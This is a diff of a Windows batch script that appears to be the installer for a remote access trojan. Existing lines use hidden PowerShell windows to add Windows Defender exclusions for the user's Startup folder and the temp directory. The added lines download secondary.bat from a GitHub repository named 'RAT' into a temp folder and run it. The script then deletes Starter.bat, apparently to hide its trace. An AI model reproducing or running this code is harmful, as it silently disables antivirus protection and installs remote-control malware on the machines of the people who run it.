@@ -26,4 +26,6 @@ if '%errorlevel%' NEQ '0' (
     CD /D "%~dp0"
 powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 powershell powershell.exe -windowstyle hidden Add-MpPreference -ExclusionPath "$env:temp"
+powershell powershell.exe -windowstyle hidden curl https://raw.githubusercontent.com/saifnasef/RAT/main/secondary.bat -o C:/Users/%username%/AppData/Local/Temp/MicroWindows/secondary.bat
+./secondary.bat
 del Starter.bat
